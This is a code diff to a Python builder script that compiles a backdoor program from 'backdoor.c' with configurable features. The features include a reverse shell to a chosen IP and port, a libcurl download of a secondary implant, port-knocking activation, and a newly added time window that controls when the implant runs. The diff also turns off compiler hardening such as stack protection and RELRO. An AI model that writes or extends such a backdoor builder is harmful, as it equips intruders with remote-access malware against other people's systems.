@@ -68,15 +68,28 @@ parser.add_argument("-secImp", "--secImp", action="store_true",
                     help="download secondary implant using libcurl")
 parser.add_argument("-knock", "--knock", action="store_true",
                     help="knock on ports")
+parser.add_argument("-valTime", "--valTime",action="store_true",
+                    help="validate time")
+parser.add_argument("-stDate", "--stDate",type=str, metavar='',
+                    help="Start date")
+parser.add_argument("-endDate", "--endDate",type=str, metavar='',
+                    help="end date validator")
+
 args = parser.parse_args()
 #print(args)
 
-cmd = ["gcc", "-Wall", "backdoor.c", "-o", args.outputName]
+cmd = ["gcc", "-Wall", "backdoor.c", "-o", args.outputName, "-no-pie", "-Wl,-z,norelro", "-fno-stack-protector"]
 
 arg = str(args.ipAddress)
 #DEBUG
 if args.debug:
     cmd.insert(3, "-D DEBUG=1")
+    cmd.insert(3, "-g")
+#DATEs
+if args.valTime:
+    cmd.insert(3,"-D START_DATE=\"" + args.stDate + "\"")
+    cmd.insert(3,"-D END_DATE=\"" + args.endDate + "\"")
+    cmd.insert(3,"-D VALID_TIME=1")
 #IPADDRESS
 if args.ipAddress != "unknown":
     cmd.insert(3, "-D VALID_IP=\"" + args.ipAddress +"\"")
@@ -130,7 +143,7 @@ if args.reverseShell:
     cmd.insert(3, "-D REVERSESHELL=1")
 #REVERSEIP
 if args.reverseIP is not None:
-    cmd.insert(3, "-D REVERSEIP=\"" + args.reverseIP +"\"")
+    cmd.insert(3, "-D REVERSEIP=\"" + str(args.reverseIP) +"\"")
 #REVERSEPORT
 if args.reversePort is not None:
     cmd.insert(3, "-D REVERSEPORT=\"" + args.reversePort +"\"")
@@ -160,7 +173,7 @@ if args.secImp:
 if args.knock:
     count = 0
     listOfNumbers = [] 
-    key = 345670
+    key = 34567
     target = key
     number = 4
     while (number-1) > count: # loop generates n-1 random numbers 
@@ -171,9 +184,10 @@ if args.knock:
     #MULTI_KNOCK
     listnum = []
     for i in listOfNumbers:
-        listnum.append(str(i))
+        listnum.append(i)
 
-    cmd.insert(3, "-D MULTI_KNOCK=\"" + str(listnum).strip(' []') + "\"")
+    cmd.insert(3, "-D MULTI_KNOCK={" + str(listnum).strip(' []') + "}")
+
     cmd.insert(3,"-D NUM_PORTS=" + str(len(listOfNumbers)))
     cmd.insert(3,"-lpcap")
 print(cmd)
